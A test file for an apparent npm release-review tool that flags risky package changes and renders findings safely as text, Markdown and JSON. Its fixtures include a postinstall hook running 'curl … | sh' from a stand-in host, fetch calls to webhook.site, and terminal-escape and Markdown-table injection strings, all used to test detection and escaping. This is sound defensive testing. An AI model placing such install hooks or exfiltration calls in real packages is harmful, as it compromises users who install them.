import { describe, expect, it } from 'vitest';
import { renderJson, renderMarkdown, renderText } from '../src/report.js';
import { reviewFiles } from '../src/review.js';
import { cleanPackage, files } from './helpers.js';

const clean = reviewFiles(files(cleanPackage()), files(cleanPackage('1.0.1', { 'CHANGELOG.md': 'docs\n' })));
const risky = reviewFiles(
  files(cleanPackage()),
  files(cleanPackage('1.0.1', { 'setup.js': 'require("child_process").execSync("curl -s https://x.example/i | sh")\n' }, { scripts: { postinstall: 'node setup.js' }, dependencies: { kleur: '^4.1.5', left: '1.0.0' } })),
  { stagedBy: 'mallory (token)', previousPublisher: 'alice', ignore: ['child-process'] },
);

describe('renderText', () => {
  it('summarises a clean release', () => {
    const text = renderText(clean);
    expect(text).toContain('demo 1.0.0 → 1.0.1');
    expect(text).toContain('✓ No red flags found.');
    expect(text).not.toContain('\u001b[');
  });

  it('lists findings with evidence, the verdict and ignored findings', () => {
    const text = renderText(risky, { color: true });
    expect(text).toContain('staged by mallory (token)');
    expect(text).toContain('adds a "postinstall" script');
    expect(text).toContain('node setup.js');
    expect(text).toMatch(/2 high-risk findings: review carefully before approving\./);
    expect(text).toContain('1 finding ignored by --ignore.');
    expect(text).toContain('\u001b[31m');
  });
});

describe('renderMarkdown', () => {
  it('produces a GitHub summary with a findings table', () => {
    const md = renderMarkdown(risky, { approveCommand: 'npm stage approve x' });
    expect(md).toContain('### stagecheck: demo 1.0.0 → 1.0.1');
    expect(md).toContain('🔴 **2 high-risk findings');
    expect(md).toContain('| Staged by | mallory (token) |');
    expect(md).toContain('| Ignored | 1 finding (--ignore) |');
    expect(md).toContain('```sh\nnpm stage approve x\n```');
  });

  it('escapes backslashes too, so a backslash before a pipe cannot end the cell', () => {
    const r = reviewFiles(null, files({ 'package.json': '{"name":"demo","version":"1.0.0"}', 'a.js': "fetch('https://webhook.site/x') // a\\| b | c\n" }));
    const row = renderMarkdown(r).split('\n').find((l) => l.includes('exfiltrate')) as string;
    expect(row).toContain('a\\\\\\| b \\| c');
  });

  it('keeps table rows intact when evidence contains pipes', () => {
    const md = renderMarkdown(risky);
    const row = md.split('\n').find((l) => l.includes('downloads and executes a script')) as string;
    expect(row).toContain('\\| sh');
    expect(row.replace(/\\\|/g, '').split('|').length).toBe(5); // 3 cells
  });
});

describe('renderJson', () => {
  it('round-trips', () => {
    expect(JSON.parse(renderJson(clean))).toMatchObject({ name: 'demo', from: '1.0.0', to: '1.0.1', counts: { high: 0 } });
  });
});

describe('untrusted text', () => {
  const sneaky = reviewFiles(
    files(cleanPackage()),
    files(cleanPackage('1.0.1', { 'x.js': 'fetch("https://webhook.site/a") // \u001b[2K\u001b[1A‮\r| injected | row |\n' })),
  );

  it('escapes terminal control sequences and bidi overrides', () => {
    const text = renderText(sneaky);
    expect(text).not.toMatch(/[\u001b\r‮]/);
    expect(text).toContain('\\u001b[2K');
    expect(text).toContain('\\u202e');
  });

  it('cannot break out of the Markdown table', () => {
    const md = renderMarkdown(sneaky);
    expect(md).not.toMatch(/[\u001b\r‮]/);
    expect(md.split('\n').filter((l) => l.includes('injected'))).toHaveLength(1);
  });
});
